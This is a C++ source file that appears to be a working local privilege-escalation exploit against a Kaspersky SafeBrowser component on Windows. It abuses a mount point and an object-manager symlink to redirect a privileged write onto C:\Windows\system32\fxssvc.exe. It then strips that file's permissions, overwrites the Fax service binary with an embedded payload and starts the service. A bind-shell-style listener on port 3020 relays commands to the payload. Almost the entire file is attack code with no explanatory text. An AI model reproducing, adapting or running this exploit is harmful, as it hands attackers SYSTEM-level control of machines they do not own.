
#include <iostream>
#include <conio.h>
#include <wchar.h>
#include <stdio.h>
#pragma comment (lib, "Ws2_32.lib")
#include <WinSock2.h>
#include "ntimports.h"
#include <sddl.h>
#include "resource.h"
#include "CommonUtils.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include <AclAPI.h>
#define FULL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
using std::cout;
using std::endl;
using std::cin;
using std::wcout;
using std::wstring;
using std::string;
#define MAX_INPUT_BUFFER 600
#define MAX_OUTPUT_BUFFER 4096
char inputUser[MAX_INPUT_BUFFER];
void readFromSocket(SOCKET& sock)
{
	int iResult;
	char outputBuffer[MAX_OUTPUT_BUFFER];;
	while (true)
	{

		iResult = recv(sock, outputBuffer, MAX_OUTPUT_BUFFER, 0);
		if (iResult == -1)
		{
			break;
		}

		if (iResult < 4096)
			outputBuffer[iResult] = '\0';
		if (_strcmpi(inputUser, outputBuffer) == 0)
			continue;
		std::cout << outputBuffer;
		fflush(stdout);
	}
}
int trigger()
{
	WSADATA wsadata;
	SOCKET sockServer, sockClient;
	SOCKADDR_IN sin;
	DWORD bytesReadFromPipe;
	int bytesReadFromSock;
	int sinLen = sizeof(SOCKADDR_IN);
	unsigned short port = 3020;

	//Socket Setup
	WSAStartup(MAKEWORD(2, 2), &wsadata);

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = 0;
	sin.sin_port = htons(port);

	sockServer = socket(AF_INET, SOCK_STREAM, 0);
	if (sockServer == SOCKET_ERROR)
		return 1;
	int yes = 1;
	setsockopt(sockServer, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes));
	::bind(sockServer, (SOCKADDR*)&sin, sizeof(sin));
	listen(sockServer, 0);
	sockClient = accept(sockServer, (SOCKADDR*)&sin, &sinLen);

	DWORD thId;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)readFromSocket, &sockClient, NULL, &thId);
	do
	{
		fgets(inputUser, MAX_INPUT_BUFFER, stdin);
		send(sockClient, inputUser, strlen(inputUser), NULL);

	} while (_strcmpi(inputUser, "exit\n") != 0);

	closesocket(sockServer);
	closesocket(sockClient);
	WSACleanup();

	return 0;
}



HANDLE CreateSymlink(HANDLE root, LPCWSTR linkname, LPCWSTR targetname)
{
	DEFINE_NTDLL(RtlInitUnicodeString);
	DEFINE_NTDLL(NtCreateSymbolicLinkObject);

	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING name;
	UNICODE_STRING target;

	fRtlInitUnicodeString(&name, linkname);
	fRtlInitUnicodeString(&target, targetname);

	InitializeObjectAttributes(&objAttr, &name, OBJ_CASE_INSENSITIVE, root, nullptr);

	HANDLE hLink;

	NTSTATUS status = fNtCreateSymbolicLinkObject(&hLink,
		SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &target);
	if (status == 0)
	{
		//DebugPrintf("Opened Link %ls -> %ls: %p\n", linkname, targetname, hLink);
		return hLink;
	}
	else
	{
		SetLastError(NtStatusToDosError(status));
		return nullptr;
	}
}
std::wstring GetUserStringSid(HANDLE htoken = GetCurrentProcessToken()) {
	if (htoken == INVALID_HANDLE_VALUE) {
		return L"";
	}
	TOKEN_USER* token = (TOKEN_USER*)malloc(TOKEN_USER_MAX_SIZE);
	DWORD ret = 0;
	GetTokenInformation(htoken, TokenUser, token, sizeof(token) * 100, &ret);

	SID* user = (SID*)token->User.Sid;
	LPTSTR wsid;
	ConvertSidToStringSidW(user, &wsid);
	return std::wstring(wsid);
}
int wmain(int argc, const wchar_t* argv[]) {

	Wow64EnableWow64FsRedirection(FALSE);
	HANDLE dir = CreateFile(L"C:\\ProgramData\\Kaspersky Lab\\SafeBrowser\\Common", FILE_WRITE_DATA,
		FULL_SHARING, NULL, OPEN_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	ReparsePoint::CreateMountPoint(dir, L"\\BaseNamedObjects\\Restricted", L"");
	CloseHandle(dir);
	wstring linkname = L"\\BaseNamedObjects\\Restricted\\" + GetUserStringSid();
	CreateSymlink(NULL, linkname.c_str(), L"\\??\\C:\\Windows\\system32\\fxssvc.exe");
	HANDLE wer = nullptr;
	do {
		wer = CreateFile(L"C:\\Windows\\system32\\fxssvc.exe",
			GENERIC_WRITE|WRITE_DAC, FULL_SHARING, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		Sleep(2000);
	} while (wer == INVALID_HANDLE_VALUE);
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res2 = FindResource(hm, MAKEINTRESOURCE(IDR_EXE1), L"exe");
	DWORD DllSize2 = SizeofResource(hm, res2);
	void* dllBuff2 = LoadResource(hm, res2);
	DWORD sizeout;
	SetSecurityInfo(wer, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
	WriteFile(wer,dllBuff2, DllSize2, &sizeout, NULL);
	CloseHandle(wer);
	SC_HANDLE sc = OpenSCManager(0, 0, GENERIC_READ);
	SC_HANDLE fax = OpenServiceW(sc, L"Fax", SERVICE_START);
	StartServiceW(fax, 0, 0);
	trigger();
	return 0;
}